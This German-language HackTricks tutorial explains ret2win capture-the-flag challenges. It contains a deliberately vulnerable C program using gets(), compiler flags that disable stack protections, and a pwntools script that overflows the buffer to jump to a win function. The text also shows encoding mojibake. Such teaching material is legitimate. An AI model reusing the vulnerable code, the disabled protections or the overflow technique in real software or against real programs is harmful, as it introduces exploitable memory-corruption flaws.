# Ret2win

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Grundinformationen

**Ret2win**-Herausforderungen sind eine beliebte Kategorie in **Capture The Flag (CTF)**-Wettbewerben, insbesondere bei Aufgaben, die **bin√§re Ausnutzung** beinhalten. Das Ziel ist es, eine Schwachstelle in einer gegebenen Bin√§rdatei auszunutzen, um eine bestimmte, nicht aufgerufene Funktion innerhalb der Bin√§rdatei auszuf√ºhren, die oft etwas wie `win`, `flag` usw. genannt wird. Diese Funktion gibt, wenn sie ausgef√ºhrt wird, normalerweise ein Flag oder eine Erfolgsmeldung aus. Die Herausforderung besteht typischerweise darin, die **R√ºcksprungadresse** auf dem Stack zu √ºberschreiben, um den Ausf√ºhrungsfluss zur gew√ºnschten Funktion umzuleiten. Hier ist eine detailliertere Erkl√§rung mit Beispielen:

### C-Beispiel

Betrachten Sie ein einfaches C-Programm mit einer Schwachstelle und einer `win`-Funktion, die wir aufrufen m√∂chten:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Um dieses Programm ohne Stack-Schutz und mit **ASLR** deaktiviert zu kompilieren, k√∂nnen Sie den folgenden Befehl verwenden:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Kompiliere das Programm als 32-Bit-Bin√§rdatei (dies ist optional, aber h√§ufig in CTF-Herausforderungen).
* `-fno-stack-protector`: Deaktiviere den Schutz gegen Stack-√úberl√§ufe.
* `-z execstack`: Erlaube die Ausf√ºhrung von Code im Stack.
* `-no-pie`: Deaktiviere Position Independent Executable, um sicherzustellen, dass die Adresse der `win`-Funktion sich nicht √§ndert.
* `-o vulnerable`: Nenne die Ausgabedatei `vulnerable`.

### Python Exploit mit Pwntools

F√ºr den Exploit verwenden wir **pwntools**, ein leistungsstarkes CTF-Framework zum Schreiben von Exploits. Das Exploit-Skript erstellt eine Payload, um den Puffer zu √ºberlaufen und die R√ºcksprungadresse mit der Adresse der `win`-Funktion zu √ºberschreiben.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Um die Adresse der `win`-Funktion zu finden, k√∂nnen Sie **gdb**, **objdump** oder ein anderes Tool verwenden, das es Ihnen erm√∂glicht, Bin√§rdateien zu inspizieren. Zum Beispiel k√∂nnten Sie mit `objdump` Folgendes verwenden:
```sh
objdump -d vulnerable | grep win
```
Dieser Befehl zeigt Ihnen die Assemblierung der `win`-Funktion, einschlie√ülich ihrer Startadresse.&#x20;

Das Python-Skript sendet eine sorgf√§ltig gestaltete Nachricht, die, wenn sie von der `vulnerable_function` verarbeitet wird, den Puffer √ºberl√§uft und die R√ºcksprungadresse auf dem Stack mit der Adresse von `win` √ºberschreibt. Wenn `vulnerable_function` zur√ºckkehrt, springt es anstelle der R√ºckkehr zu `main` oder des Verlassens zu `win`, und die Nachricht wird ausgegeben.

## Schutzma√ünahmen

* [**PIE**](../common-binary-protections-and-bypasses/pie/) **sollte deaktiviert sein**, damit die Adresse √ºber verschiedene Ausf√ºhrungen hinweg zuverl√§ssig ist, oder die Adresse, an der die Funktion gespeichert wird, wird nicht immer gleich sein und Sie ben√∂tigen einen Leak, um herauszufinden, wo die win-Funktion geladen ist. In einigen F√§llen, wenn die Funktion, die den √úberlauf verursacht, `read` oder √§hnlich ist, k√∂nnen Sie einen **Teilweisen √úberschreibung** von 1 oder 2 Bytes durchf√ºhren, um die R√ºcksprungadresse auf die win-Funktion zu √§ndern. Aufgrund der Funktionsweise von ASLR sind die letzten drei hexadezimalen Nibbles nicht randomisiert, sodass es eine **1/16 Chance** (1 Nibble) gibt, die korrekte R√ºcksprungadresse zu erhalten.
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/) sollten ebenfalls deaktiviert sein, oder die kompromittierte EIP-R√ºcksprungadresse wird niemals befolgt.

## Weitere Beispiele & Referenzen

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32 Bit, kein ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 Bit mit ASLR, mit einem Leak der Bin-Adresse
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 Bit, kein ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 Bit, kein ASLR, doppelter kleiner √úberlauf, zuerst den Stack √ºberlaufen und die Gr√∂√üe des zweiten √úberlaufs vergr√∂√üern
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 Bit, relro, kein Canary, nx, kein pie, Format-String, um die Adresse `fflush` mit der win-Funktion (ret2win) zu √ºberschreiben
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 Bit, relro, kein Canary, nx, pie. Teilweise √úberschreibung, um die win-Funktion (ret2win) aufzurufen

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterst√ºtzen</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
